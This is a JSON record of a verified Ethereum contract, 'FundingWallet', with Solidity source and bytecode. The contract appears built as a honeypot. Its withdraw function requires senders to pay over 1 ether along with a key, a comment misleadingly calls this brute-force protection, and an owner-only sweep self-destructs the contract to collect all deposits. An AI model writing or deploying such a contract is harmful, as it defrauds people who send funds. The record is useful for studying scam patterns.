{
  "address": "0x1c2389c0b8014be72e11849ec0aa790b03929e18",
  "chain": "ETH",
  "chainID": 1,
  "verifier": "etherscan.io",
  "commonName": "",
  "contractName": "FundingWallet",
  "compilerVersion": "v0.4.25+commit.59dbf8f1",
  "optimization": false,
  "runs": "200",
  "evmVersion": "default",
  "sourceCode": "/**\n *Submitted for verification at Etherscan.io on 2018-12-28\n*/\n\npragma solidity ^0.4.25;\n\ncontract FundingWallet\n{\n    bytes32 keyHash;\n    address owner;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    function withdraw(string key) public payable\n    {\n        require(msg.sender == tx.origin);\n        if(keyHash == keccak256(abi.encodePacked(key))) {\n            //Prevent brute force\n            if(msg.value > 1 ether) {\n                msg.sender.transfer(address(this).balance);\n            }\n        }\n    }\n\n    //setup with string\n    function setup(string key) public\n    {\n        if (keyHash == 0x0) {\n            keyHash = keccak256(abi.encodePacked(key));\n        }\n    }\n\n    //update the keyhash\n    function update(bytes32 _keyHash) public\n    {\n        if (keyHash == 0x0) {\n            keyHash = _keyHash;\n        }\n    }\n\n    //empty the wallet\n    function sweep() public\n    {\n        require(msg.sender == owner);\n        selfdestruct(owner);\n    }\n\n    //deposit\n    function () public payable {\n\n    }\n}",
  "bytecode": "608060405234801561001057600080fd5b5033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506104d1806100616000396000f300608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680632bc385311461006457806331fb67c2146100cd57806335faa416146101295780638b14724514610140575b005b34801561007057600080fd5b506100cb600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290505050610171565b005b610127600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290505050610260565b005b34801561013557600080fd5b5061013e6103ed565b005b34801561014c57600080fd5b5061016f6004803603810190808035600019169060200190929190505050610484565b005b600060010260005460001916141561025d57806040516020018082805190602001908083835b6020831015156101bc5780518252602082019150602081019050602083039250610197565b6001836020036101000a0380198251168184511680821785525050505050509050019150506040516020818303038152906040526040518082805190602001908083835b6020831015156102255780518252602082019150602081019050602083039250610200565b6001836020036101000a0380198251168184511680821785525050505050509050019150506040518091039020600081600019169055505b50565b3273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561029a57600080fd5b806040516020018082805190602001908083835b6020831015156102d357805182526020820191506020810190506020830392506102ae565b6001836020036101000a0380198251168184511680821785525050505050509050019150506040516020818303038152906040526040518082805190602001908083835b60208310151561033c5780518252602082019150602081019050602083039250610317565b6001836020036101000a0380198251168184511680821785525050505050509050019150506040518091039020600019166000546000191614156103ea57670de0b6b3a76400003411156103e9573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156103e7573d6000803e3d6000fd5b505b5b50565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561044957600080fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16ff5b60006001026000546000191614156104a25780600081600019169055505b505600a165627a7a723058208b9041418dd97a0870fc510132883eb4084c9b77fbaa6145ccd5bc9c264f00da0029"
}